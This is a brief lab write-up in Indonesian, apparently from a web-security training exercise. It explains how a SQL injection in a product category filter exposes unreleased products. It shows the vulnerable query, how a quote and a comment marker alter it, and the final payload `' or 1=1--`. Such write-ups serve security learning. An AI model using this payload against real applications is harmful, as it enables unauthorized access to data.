Short Info:
    - SQLInjection di produk kategori filter

    - web app menggunakan queries berikut untuk display produk berdasarkan kategori
```sql 
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

End Goal: 
    -   display semua produk, baik yang sudah rilis ataupun belum.

Analisis:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

`SELECT * FROM products WHERE category = ''' AND released = 1`

`SELECT * FROM products WHERE category = 'Gifts'--   AND released = 1`

Payload:
```sql 
SELECT * FROM products WHERE category = '' or 1=1--
```
